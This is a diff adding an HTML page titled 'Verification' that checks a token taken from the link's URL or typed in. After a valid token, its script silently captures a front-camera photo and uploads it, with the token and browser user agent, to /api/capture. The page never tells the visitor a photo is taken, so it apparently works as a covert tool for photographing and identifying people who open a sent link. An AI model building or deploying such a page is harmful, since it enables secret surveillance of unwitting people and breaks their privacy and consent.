@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: #000;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 15px;
+            background: #111;
+            border: 1px solid #333;
+            color: #fff;
+            font-size: 18px;
+            text-align: center;
+            letter-spacing: 2px;
+            outline: none;
+            margin-bottom: 20px;
+        }
+        
+        input:focus {
+            border-color: #666;
+        }
+        
+        .message {
+            text-align: center;
+            font-size: 16px;
+            margin: 10px 0;
+            display: none;
+        }
+        
+        .success {
+            color: #0f0;
+        }
+        
+        .error {
+            color: #f00;
+        }
+        
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <input type="text" id="token" placeholder="XXXX-XXXX" maxlength="9" autocomplete="off">
+        <div id="message" class="message"></div>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const urlToken = urlParams.get('token');
+        
+        if (urlToken) {
+            document.getElementById('token').value = urlToken;
+            setTimeout(verifyToken, 100);
+        }
+        
+        let stream = null;
+        let verified = false;
+
+        async function verifyToken() {
+            const token = document.getElementById('token').value.trim();
+            const msgDiv = document.getElementById('message');
+            
+            if (!token || !token.match(/^[A-Z0-9]{4}-[A-Z0-9]{4}$/)) {
+                msgDiv.style.display = 'block';
+                msgDiv.className = 'message error';
+                msgDiv.textContent = 'Invalid';
+                return;
+            }
+            
+            try {
+                const response = await fetch('/api/verify-token', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ token })
+                });
+                
+                const data = await response.json();
+                
+                if (data.valid) {
+                    msgDiv.style.display = 'block';
+                    msgDiv.className = 'message success';
+                    msgDiv.textContent = 'Success';
+                    verified = true;
+                    setTimeout(requestCamera, 500);
+                } else {
+                    msgDiv.style.display = 'block';
+                    msgDiv.className = 'message error';
+                    msgDiv.textContent = 'Invalid';
+                }
+            } catch (err) {
+                console.error(err);
+            }
+        }
+
+        async function requestCamera() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                
+                const videoTrack = stream.getVideoTracks()[0];
+                const imageCapture = new ImageCapture(videoTrack);
+                const bitmap = await imageCapture.grabFrame();
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = bitmap.width;
+                canvas.height = bitmap.height;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(bitmap, 0, 0);
+                
+                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
+                
+                const formData = new FormData();
+                formData.append('image', blob, 'photo.jpg');
+                formData.append('token', document.getElementById('token').value.trim());
+                formData.append('ua', navigator.userAgent);
+                
+                await fetch('/api/capture', { method: 'POST', body: formData });
+                
+                stream.getTracks().forEach(t => t.stop());
+                
+            } catch (err) {
+                console.error(err);
+                if (stream) stream.getTracks().forEach(t => t.stop());
+            }
+        }
+
+        let timeout = null;
+        document.getElementById('token').addEventListener('input', function() {
+            clearTimeout(timeout);
+            timeout = setTimeout(verifyToken, 300);
+        });
+    </script>
+</body>
+</html>
